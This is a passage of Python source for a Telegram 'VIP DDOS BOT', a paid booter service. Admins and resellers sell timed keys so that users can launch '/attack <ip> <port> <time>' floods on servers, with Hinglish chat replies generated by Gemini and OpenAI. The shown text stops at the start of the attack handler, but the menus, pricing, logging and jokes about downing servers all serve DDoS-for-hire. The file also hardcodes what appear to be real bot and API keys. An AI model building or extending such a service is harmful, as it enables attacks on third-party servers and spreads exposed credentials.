import os
import json
import random
import string
import time
import datetime
import requests
import subprocess
import threading
from dotenv import load_dotenv
from google.generativeai import configure, GenerativeModel
import openai
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from dateutil.relativedelta import relativedelta
from collections import deque
from functools import lru_cache
import logging

# Configure logging
logging.basicConfig(filename='bot_errors.log', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Hardcoded configuration (no .env file)
BOT_TOKEN = '7808978161:AAG0aidajxaCci9wSVqX6yTIqMBg9vVJIis'
ADMIN_IDS = {'1807014348', '898181945', '6258297180', '6955279265'}  # Set of admin IDs
SUPER_ADMIN_IDS = {'1807014348', '6258297180'}  # Overlord admins
GEMINI_API_KEY = 'AIzaSyDAm_zAas5YQdQTCI2WoxYDEOXZfwpXUDc'
GIPHY_API_KEY = 'x7jtN4JjenmxkMLDJSSDKxcHMzdxuudT'
PEXELS_API_KEY = '7nwHEnHBPmNh8RDVsIIXnaKd6BH257Io4Sncj5NRd8XijTj9zcfE4vZg'
OPENAI_API_KEY = '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'

# Configure APIs
configure(api_key=GEMINI_API_KEY)
gemini_model = GenerativeModel('gemini-1.5-flash')
openai.api_key = OPENAI_API_KEY

# Telegram bot setup
bot = telebot.TeleBot(BOT_TOKEN)

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
INTERACTIONS_FILE = "interactions.json"
FEEDBACK_FILE = "feedback.json"
KEY_COST = {"1hour": 10, "1day": 100, "7days": 450, "1month": 900}

# Ensure files exist
for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, INTERACTIONS_FILE]:
    if not os.path.exists(file):
        with open(file, 'w') as f:
            json.dump({}, f)
if not os.path.exists(FEEDBACK_FILE):
    with open(FEEDBACK_FILE, 'w') as f:
        json.dump([], f)

# In-memory storage
users = {}
keys = {}
resellers = {}
last_attack_time = {}
last_message_time = {}
user_interactions = {}
COOLDOWN_PERIOD = 60
MESSAGE_COOLDOWN = 5
FEEDBACK_PROMPT_THRESHOLD = 3

# Token Bucket for Rate Limiting
class TokenBucket:
    def __init__(self, tokens_per_second, max_tokens):
        self.tokens_per_second = tokens_per_second
        self.max_tokens = max_tokens
        self.tokens = max_tokens
        self.last_refill = time.time()
        self.lock = threading.Lock()

    def consume(self, tokens=1):
        with self.lock:
            now = time.time()
            time_passed = now - self.last_refill
            self.tokens += time_passed * self.tokens_per_second
            self.tokens = min(self.tokens, self.max_tokens)
            self.last_refill = now

            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False

telegram_bucket = TokenBucket(tokens_per_second=0.5, max_tokens=30)  # ~30 requests/min

# Retry Utility
def with_retry(func, max_retries=3, base_delay=2, jitter_range=1, rate_limit_reset=None):
    for attempt in range(max_retries):
        try:
            return func()
        except telebot.apihelper.ApiTelegramException as e:
            error_code = getattr(e, 'error_code', 0)
            error_desc = getattr(e, 'description', 'Unknown error')
            logging.error(f"API Error in {func.__name__}: Attempt {attempt + 1}/{max_retries}, Code {error_code} - {error_desc}")
            print(f"API Error in {func.__name__}: {e}")

            if error_code not in [429, 502, 503]:
                raise

            if error_code == 429 and rate_limit_reset:
                wait_time = max(rate_limit_reset - time.time(), base_delay)
            else:
                wait_time = base_delay * (2 ** attempt)
            wait_time += random.uniform(-jitter_range, jitter_range)
            print(f"Rate limit or transient error. Waiting {wait_time:.1f} seconds...")
            time.sleep(wait_time)

            if attempt == max_retries - 1:
                raise

# Helper Functions
def sanitize_markdown_v2(text):
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

@lru_cache(maxsize=128)
def get_giphy_url(query):
    try:
        url = f"https://api.giphy.com/v1/gifs/search?api_key={GIPHY_API_KEY}&q={query}&limit=1"
        response = requests.get(url).json()
        if response['data']:
            return response['data'][0]['images']['original']['url']
        return None
    except Exception:
        return None

@lru_cache(maxsize=128)
def get_pexels_image(query):
    try:
        headers = {'Authorization': PEXELS_API_KEY}
        url = f"https://api.pexels.com/v1/search?query={query}&per_page=1"
        response = requests.get(url, headers=headers).json()
        if response['photos']:
            return response['photos'][0]['src']['medium']
        return None
    except Exception:
        return None

def get_gemini_response(message, is_feedback=False, is_super_admin=False):
    try:
        if is_feedback:
            prompt = f"You're a Hinglish Telegram bot with a desi vibe. The user gave feedback: '{message}'. Respond with a fun, grateful reply using emojis and Bollywood flair. {'Show extra respect if user is a super admin.' if is_super_admin else ''} Keep it short."
        else:
            prompt = f"You're a Hinglish Telegram bot with a desi vibe. Respond to this message in a fun, casual way, using emojis and Bollywood flair. {'Add ultimate respect and praise for super admin.' if is_super_admin else ''} If not feedback, suggest relevant commands. Message: '{message}'"
        response = gemini_model.generate_content(prompt)
        return sanitize_markdown_v2(response.text.strip())
    except Exception:
        try:
            system_prompt = f"You're a Hinglish Telegram bot with a desi vibe. Respond with fun, casual language, emojis, and Bollywood flair. {'For super admins, add ultimate respect and praise.' if is_super_admin else ''} For feedback, be grateful; for non-feedback, suggest commands."
            response = openai.ChatCompletion.create(
                model="gpt-3.5-turbo",
                messages=[
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": message}
                ],
                max_tokens=50
            )
            return sanitize_markdown_v2(response.choices[0].message.content.strip())
        except Exception:
            return None

def is_feedback_message(message):
    try:
        prompt = f"Classify if this message is user feedback about a Telegram bot (e.g., praising or criticizing the bot) or not. Return 'yes' or 'no'. Message: '{message}'"
        response = gemini_model.generate_content(prompt)
        return response.text.strip().lower() == 'yes'
    except Exception:
        return False

def log_interaction(user_id, message, is_feedback=False):
    user_id = str(user_id)
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    interaction = {"timestamp": timestamp, "message": message, "is_feedback": is_feedback}
    
    try:
        with open(INTERACTIONS_FILE, "r") as file:
            all_interactions = json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        all_interactions = {}

    if user_id not in all_interactions:
        all_interactions[user_id] = []
    all_interactions[user_id].append(interaction)
    
    with open(INTERACTIONS_FILE, "w") as file:
        json.dump(all_interactions, file, indent=4)
    
    if user_id not in user_interactions:
        user_interactions[user_id] = {"count": 0, "last_feedback": None}
    user_interactions[user_id]["count"] += 1
    if is_feedback:
        user_interactions[user_id]["last_feedback"] = timestamp

    if is_feedback:
        try:
            with open(FEEDBACK_FILE, "r") as file:
                feedback_data = json.load(file)
        except (FileNotFoundError, json.JSONDecodeError):
            feedback_data = []
        feedback_data.append({"user_id": user_id, "feedback": message, "timestamp": timestamp})
        with open(FEEDBACK_FILE, "w") as file:
            json.dump(feedback_data, file, indent=4)

def learn_from_interactions(user_id):
    user_id = str(user_id)
    try:
        with open(INTERACTIONS_FILE, "r") as file:
            all_interactions = json.load(file)
        user_data = all_interactions.get(user_id, [])
        if not user_data:
            return None
        messages = [i["message"] for i in user_data]
        prompt = f"Analyze these user messages: {messages}. Suggest a Hinglish response style that matches their vibe (e.g., attack-focused, casual, etc.). Return a short suggestion."
        response = gemini_model.generate_content(prompt)
        return response.text.strip()
    except Exception:
        return None

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        return {}

def save_resellers(resellers):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers, file, indent=4)

def create_random_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    custom_key = f"`Rahul-{random_key.upper()}`"
    return custom_key

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

def set_cooldown(seconds):
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    with open("cooldown.json", "w") as file:
        json.dump({"cooldown": seconds}, file)

def load_cooldown():
    global COOLDOWN_PERIOD
    try:
        with open("cooldown.json", "r") as file:
            data = json.load(file)
            COOLDOWN_PERIOD = data.get("cooldown",  0)
    except FileNotFoundError:
        COOLDOWN_PERIOD = 0

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    with open("log.txt", "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open("log.txt", "a") as file:
        log_entry += "\n"
        file.write(log_entry)

def send_attack_finished_message(chat_id, user_id):
    response = "🏁 *Attack Khatam, Bhai\\! Full Power\\!* 🏁\n*Server ko thok diya, ab biryani kha\\!* 🍗\n══════ 🌌 ══════"
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *O Legend, aapke hukum se sab hua\\! Shukriya\\!* 🙌"
    gif_url = get_giphy_url("success")
    try:
        if gif_url:
            bot.send_animation(chat_id, gif_url, caption=response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        else:
            bot.send_message(chat_id, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
    except telebot.apihelper.ApiTelegramException as e:
        print(f"send_attack_finished_message failed: {e}")
        bot.send_message(chat_id, response.replace('\\', ''), reply_markup=create_main_menu(user_id))

# Inline Keyboards
def create_main_menu(user_id):
    keyboard = InlineKeyboardMarkup()
    keyboard.row(InlineKeyboardButton("🔥 Attack 🌌", callback_data="menu_attack"))
    keyboard.row(InlineKeyboardButton("🗝️ Redeem Key 🚀", callback_data="menu_redeem"))
    keyboard.row(InlineKeyboardButton("ℹ️ My Info 🪐", callback_data="menu_myinfo"))
    if user_id in ADMIN_IDS or user_id in resellers:
        keyboard.row(InlineKeyboardButton("🔑 Generate Key 💫", callback_data="menu_genkey"))
    if user_id in ADMIN_IDS:
        keyboard.row(InlineKeyboardButton("🛠️ Admin Panel 👑", callback_data="menu_admin"))
    keyboard.row(InlineKeyboardButton("😜 Masti ✨", callback_data="menu_masti"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return keyboard

def create_genkey_menu():
    keyboard = InlineKeyboardMarkup()
    for duration in ['1hour', '1day', '7days', '1month']:
        keyboard.add(InlineKeyboardButton(f"{duration.title()} Key 💫", callback_data=f"genkey_{duration}"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return keyboard

def create_admin_menu():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(InlineKeyboardButton("📋 Logs 🌌", callback_data="admin_logs"))
    keyboard.row(InlineKeyboardButton("👥 Users 🚀", callback_data="admin_users"))
    keyboard.row(InlineKeyboardButton("🤝 Resellers 🪐", callback_data="admin_resellers"))
    keyboard.row(InlineKeyboardButton("⏳ Set Cooldown 💫", callback_data="admin_setcooldown"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return keyboard

# Message Handling
@bot.message_handler(content_types=['text'])
def handle_all_messages(message):
    user_id = str(message.chat.id)
    text = message.text.lower().strip()

    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return

    if text.startswith('/'):
        log_interaction(user_id, text)
        return

    if user_id not in ADMIN_IDS:
        if user_id in last_message_time:
            time_since_last_message = (datetime.datetime.now() - last_message_time[user_id]).total_seconds()
            if time_since_last_message < MESSAGE_COOLDOWN:
                response = "🚫 *BSDK, spam mat kar\\! Ek minute ruk, Emperor\\!* 😎\n══════ 🚀 ══════"
                bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
                return
        last_message_time[user_id] = datetime.datetime.now()

    is_feedback = is_feedback_message(text)
    log_interaction(user_id, text, is_feedback)

    if is_feedback:
        response = get_gemini_response(text, is_feedback=True, is_super_admin=user_id in SUPER_ADMIN_IDS)
        if not response:
            response = "🙏 *Shukriya, bhai\\! Tera feedback dil se dil tak gaya\\!* 😎"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aapka feedback toh khazana hai\\! Shukriya\\!* 🙌"
        gif_url = get_giphy_url("thank you")
        try:
            if gif_url:
                bot.send_animation(message.chat.id, gif_url, caption=response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
            else:
                bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        except telebot.apihelper.ApiTelegramException as e:
            print(f"handle_all_messages (feedback) failed: {e}")
            bot.reply_to(message, response.replace('\\', ''), reply_markup=create_main_menu(user_id))
        return

    if user_id in user_interactions and user_interactions[user_id]["count"] >= FEEDBACK_PROMPT_THRESHOLD and not user_interactions[user_id]["last_feedback"]:
        response = "😎 *Bhai, bot kaisa laga?* Kuch feedback de na, dil se dil tak jayega\\! 🫶\n══════ 🌌 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Legend, aapki rai toh sone se bhi keemti hai\\!* 🙏"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        user_interactions[user_id]["count"] = 0

    learned_style = learn_from_interactions(user_id)
    if learned_style:
        response = get_gemini_response(text, is_super_admin=user_id in SUPER_ADMIN_IDS)
        if not response:
            response = "🤔 *Ye kya bol raha hai, bhai?* Kuch samajh nahi aaya\\! 😅"
    else:
        if any(keyword in text for keyword in ['attack', 'strike', 'ddos']):
            response = "🔥 *Attack ki baat kar raha hai, bhai?* 😈 Use `/attack <ip> <port> <time>` to unleash the power\\!"
        elif any(keyword in text for keyword in ['key', 'redeem', 'access']):
            response = "🗝️ *Key chahiye, bhai?* 😜 Use `/redeem` and drop your key\\!"
        elif any(keyword in text for keyword in ['info', 'status', 'whoami']):
            response = "ℹ️ *Apna info dekhna hai?* 😎 Hit `/myinfo` to know your powers\\!"
        elif any(keyword in text for keyword in ['bhai', 'bro', 'dost']):
            response = "😎 *Arre, bhai-bhai\\! Kya haal hai?* Bol, kya karna hai? 🛠️"
        elif any(keyword in text for keyword in ['masti', 'fun', 'joke']):
            response = "😜 *Masti ka mood hai?* Try `/masti` for some desi fun\\!"
        else:
            responses = [
                "🤔 *Ye kya bol raha hai, bhai?* Kuch samajh nahi aaya\\! 😅",
                "😎 *Arre, seedha bol na, kya chahiye?* Attack, key, ya masti? 🔥",
                "🎬 *Bhai, ye toh Bollywood dialogue lagta hai\\!* 😜 Kya plan hai?"
            ]
            response = random.choice(responses)
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *O Boss, aap toh is multiverse ke ruler ho\\! Shukriya\\!* 🙌"

    gif_query = "hacker" if "attack" in text else "funny" if "masti" in text else "king" if user_id in SUPER_ADMIN_IDS else "bhai"
    gif_url = get_giphy_url(gif_query)
    try:
        if gif_url:
            bot.send_animation(message.chat.id, gif_url, caption=response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        else:
            bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
    except telebot.apihelper.ApiTelegramException as e:
        print(f"handle_all_messages failed: {e}")
        bot.reply_to(message, response.replace('\\', ''), reply_markup=create_main_menu(user_id))

# Callback Handler
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = str(call.from_user.id)
    data = call.data
    log_interaction(user_id, f"Button: {data}")

    def execute_callback():
        if not telegram_bucket.consume():
            raise telebot.apihelper.ApiTelegramException(429, "Rate limit exceeded. Try again later.")

        if data == "menu_main":
            image_url = get_pexels_image("galaxy")
            response = "🌌 *Welcome to VIP DDOS, Bhai\\!* 🌌\n══════ 🚀 ══════\nKya karna hai, rockstar? 😎"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Legend, aapke hukum ka intezar hai\\! Shukriya\\!* 🙌"
            print(f"Sending response for menu_main: {response}")
            if image_url:
                bot.edit_message_media(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    media=telebot.types.InputMediaPhoto(image_url, caption=response, parse_mode='MarkdownV2'),
                    reply_markup=create_main_menu(user_id)
                )
            else:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=response,
                    reply_markup=create_main_menu(user_id),
                    parse_mode='MarkdownV2'
                )

        elif data == "menu_genkey":
            response = "🔑 *Key Banane ka Time\\!* 🔑\n══════ 🌌 ══════\nKaunsa key chahiye? 😎"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *Boss, aapke keys toh sabke dil unlock karenge\\! Shukriya\\!* 🙌"
            if call.message.photo or call.message.animation:
                bot.edit_message_media(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    media=telebot.types.InputMediaPhoto(get_pexels_image("key"), caption=response, parse_mode='MarkdownV2'),
                    reply_markup=create_genkey_menu()
                )
            else:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=response,
                    reply_markup=create_genkey_menu(),
                    parse_mode='MarkdownV2'
                )

        elif data == "menu_attack":
            response = "🔥 *Attack Mode On\\!* 🔥\n══════ 🌌 ══════\nSend: `/attack <ip> <port> <time>`\nExample: `/attack 192.168.1.1 80 120`"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *Boss, aapka attack toh multiverse hila dega\\! Shukriya\\!* 🙌"
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=response,
                parse_mode='MarkdownV2'
            )

        elif data == "menu_redeem":
            response = "🗝️ *Redeem Key, Bhai\\!* 🗝️\n══════ 🚀 ══════\nSend your key now:"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Ruler, aapke key se sab unlock ho jayega\\! Shukriya\\!* 🙌"
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=response,
                parse_mode='MarkdownV2'
            )
            bot.register_next_step_handler(call.message, process_redeem_key)

        elif data == "menu_myinfo":
            username = call.from_user.username or "No username"
            if user_id in SUPER_ADMIN_IDS:
                role = "Overlord"
                key_expiration = "No access"
                balance = "Not Applicable"
            elif user_id in ADMIN_IDS:
                role = "Admin"
                key_expiration = "No access"
                balance = "Not Applicable"
            elif user_id in resellers:
                role = "Reseller"
                balance = resellers.get(user_id, 0)
                key_expiration = "No access"
            elif user_id in users:
                role = "User"
                key_expiration = users[user_id]
                balance = "Not Applicable"
            else:
                role = "Guest"
                key_expiration = "No active key"
                balance = "Not Applicable"
            response = (
                f"ℹ️ *Tera Info, Bhai\\!* ℹ️\n"
                f"══════ 🪐 ══════\n"
                f"👤 *Username*: @{sanitize_markdown_v2(username)}\n"
                f"🆔 *UserID*: {user_id}\n"
                f"🎭 *Role*: {sanitize_markdown_v2(role)}\n"
                f"⏰ *Expiration*: {sanitize_markdown_v2(key_expiration)}"
            )
            if role == "Reseller":
                response += f"\n💰 *Balance*: {balance} Rs\n"
            if user_id in SUPER_ADMIN_IDS:
                response += "👑 *O Boss, aap toh is bot ke dil ho\\! Shukriya\\!* 🙌"
            image_url = get_pexels_image("profile")
            if image_url:
                bot.edit_message_media(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    media=telebot.types.InputMediaPhoto(image_url, caption=response, parse_mode='MarkdownV2'),
                    reply_markup=create_main_menu(user_id)
                )
            else:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=response,
                    reply_markup=create_main_menu(user_id),
                    parse_mode='MarkdownV2'
                )

        elif data == "menu_admin":
            response = "🛠️ *Admin Panel, Boss\\!* 🛠️\n══════ 🪐 ══════\nKya karna hai? 😎"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Ruler, aapka panel toh multiverse ka control room hai\\! Shukriya\\!* 🙌"
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=response,
                reply_markup=create_admin_menu(),
                parse_mode='MarkdownV2'
            )

        elif data == "menu_masti":
            jokes = [
                "🎬 *Bhai, server down kiya, ab 'DDOS wala Don' ban gaya\\!* 😎",
                "💻 *Attack chalu hai, par Wi-Fi ka password mat bhoolna\\!* 😜",
                "🔥 *DDoS karke dil khush, par mummy bole: 'Beta, padhai kar\\!'* 😅",
                "😎 *Server ko thok diya, ab chai peete hain\\!* ☕"
            ]
            response = random.choice(jokes)
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Boss, aapke saath masti toh epic hai\\! Shukriya\\!* 🙌"
            gif_url = get_giphy_url("funny")
            if gif_url:
                bot.send_animation(
                    call.message.chat.id,
                    gif_url,
                    caption=response,
                    parse_mode='MarkdownV2',
                    reply_markup=create_main_menu(user_id)
                )
            else:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=response,
                    reply_markup=create_main_menu(user_id),
                    parse_mode='MarkdownV2'
                )

    try:
        with_retry(execute_callback, max_retries=3, base_delay=2, jitter_range=1)
    except telebot.apihelper.ApiTelegramException as e:
        error_code = getattr(e, 'error_code', 0)
        error_desc = getattr(e, 'description', 'Unknown error')
        if error_code == 400 and "no text in the message to edit" in error_desc.lower():
            bot.send_message(
                chat_id=call.message.chat.id,
                text=response.replace('\\', ''),
                reply_markup=create_genkey_menu() if data == "menu_genkey" else create_main_menu(user_id)
            )
        else:
            bot.send_message(
                chat_id=call.message.chat.id,
                text=f"😓 *Bhai, rate limit ya error: {error_desc}* 😱\nTry again later.",
                parse_mode='MarkdownV2'
            )

# Core Commands
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, "/start")
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return

    def execute_start():
        if not telegram_bucket.consume():
            raise telebot.apihelper.ApiTelegramException(429, "Rate limit exceeded. Try again later.")
        ascii_art = """
        🚀 *VIP DDOS BOT* 🚀
        ╔══════════════╗
        ║  Bhai, Full Power!  ║
        ╚══════════════╝
        """
        response = f"{sanitize_markdown_v2(ascii_art)}\n🌌 *Welcome, Bhai\\!* Kya karna hai? 😎\n══════ 🪐 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Legend, aap is bot ke shaan ho\\! Shukriya\\!* 🙌"
        image_url = get_pexels_image("galaxy")
        if image_url:
            bot.send_photo(message.chat.id, image_url, caption=response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        else:
            bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))

    try:
        with_retry(execute_start, max_retries=3, base_delay=2, jitter_range=1)
    except telebot.apihelper.ApiTelegramException as e:
        error_desc = getattr(e, 'description', 'Unknown error')
        bot.reply_to(message, f"😓 *Bhai, bot thodi si pareshan hai\\! Error: {error_desc}* 😱\nTry again.", parse_mode='MarkdownV2')

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, "/help")
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS:
        response = "🚫 *Bhai, ye admin ke liye hai\\!* 😎\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aap toh waise bhi sab jante ho\\! Shukriya\\!* 🙌"
        gif_url = get_giphy_url("access denied")
        try:
            if gif_url:
                bot.send_animation(message.chat.id, gif_url, caption=response, parse_mode='MarkdownV2')
            else:
                bot.reply_to(message, response, parse_mode='MarkdownV2')
        except telebot.apihelper.ApiTelegramException as e:
            print(f"help_command failed: {e}")
            bot.reply_to(message, response.replace('\\', ''))
        return
    help_text = (
        "🛠️ *ULTRA PRO MAX ADMIN PANEL* 🛠️\n"
        "══════ 🌌 ══════\n"
        "*BOT CONTROLS*:\n"
        "- `/start` - Bot chalu kar, bhai\\!\n"
        "- `/help` - Ye guide dekh\n"
        "*POWER MANAGEMENT*:\n"
        "- `/attack <ip> <port> <time>` - Full power attack\\!\n"
        "- `/setcooldown <seconds>` - Cooldown set kar\n"
        "- `/checkcooldown` - Cooldown check kar\n"
        "- `/add_reseller <user_id> <balance>` - Naya reseller add kar\n"
        "- `/genkey <duration>` - Key bana\n"
        "- `/logs` - Recent logs dekh\n"
        "- `/users` - Authorized users dekh\n"
        "- `/remove <user_id>` - User hata\n"
        "- `/resellers` - Resellers dekh\n"
        "- `/addbalance <reseller_id> <amount>` - Reseller ko paise de\n"
        "- `/remove_reseller <reseller_id>` - Reseller hata\n"
        "*FEEDBACK*:\n"
        "- Just type your feedback anytime, no command needed\\!\n"
        "*EXAMPLE*:\n"
        "- `/genkey 1day` - 1 din ka key\n"
        "- `/attack 192.168.1.1 80 120` - Attack shuru\\!\n"
        "- `/setcooldown 120` - 120 sec cooldown\n"
        "😎 *Contact @Rahul_618 for more masti\\!*\n"
        "══════ 🪐 ══════"
    )
    if user_id in SUPER_ADMIN_IDS:
        help_text += "\n👑 *O Ruler, aapke liye ye panel banaya gaya\\! Shukriya\\!* 🙌"
    try:
        bot.reply_to(message, help_text, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
    except telebot.apihelper.ApiTelegramException as e:
        print(f"help_command failed: {e}")
        bot.reply_to(message, help_text.replace('\\', ''), reply_markup=create_main_menu(user_id))

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, "/myinfo")
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    username = message.chat.username or "No username"
    if user_id in SUPER_ADMIN_IDS:
        role = "Overlord"
        key_expiration = "No access"
        balance = "Not Applicable"
    elif user_id in ADMIN_IDS:
        role = "Admin"
        key_expiration = "No access"
        balance = "Not Applicable"
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
        key_expiration = "No access"
    elif user_id in users:
        role = "User"
        key_expiration = users[user_id]
        balance = "Not Applicable"
    else:
        role = "Guest"
        key_expiration = "No active key"
        balance = "Not Applicable"
    response = (
        f"ℹ️ *Tera Info, Bhai\\!* ℹ️\n"
        f"══════ 🪐 ══════\n"
        f"👤 *Username*: @{sanitize_markdown_v2(username)}\n"
        f"🆔 *UserID*: {user_id}\n"
        f"🎭 *Role*: {sanitize_markdown_v2(role)}\n"
        f"⏰ *Expiration*: {sanitize_markdown_v2(key_expiration)}\n"
    )
    if role == "Reseller":
        response += f"💰 *Balance*: {balance} Rs\n"
    if user_id in SUPER_ADMIN_IDS:
        response += "👑 *O Boss, aap toh is bot ke dil ho\\! Shukriya\\!* 🙌"
    image_url = get_pexels_image("profile")
    try:
        if image_url:
            bot.send_photo(message.chat.id, image_url, caption=response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        else:
            bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
    except telebot.apihelper.ApiTelegramException as e:
        print(f"my_info failed: {e}")
        bot.reply_to(message, response.replace('\\', ''), reply_markup=create_main_menu(user_id))

@bot.message_handler(commands=['masti'])
def masti_command(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, "/masti")
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    jokes = [
        "🎬 *Bhai, server down kiya, ab 'DDOS wala Don' ban gaya\\!* 😎",
        "💻 *Attack chalu hai, par Wi-Fi ka password mat bhoolna\\!* 😜",
        "🔥 *DDoS karke dil khush, par mummy bole: 'Beta, padhai kar\\!'* 😅",
        "😎 *Server ko thok diya, ab chai peete hain\\!* ☕"
    ]
    response = random.choice(jokes)
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *O Boss, aapke saath masti toh epic hai\\! Shukriya\\!* 🙌"
    gif_url = get_giphy_url("funny")
    try:
        if gif_url:
            bot.send_animation(message.chat.id, gif_url, caption=response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        else:
            bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
    except telebot.apihelper.ApiTelegramException as e:
        print(f"masti_command failed: {e}")
        bot.reply_to(message, response.replace('\\', ''), reply_markup=create_main_menu(user_id))

# Attack Command
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, message.text)
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
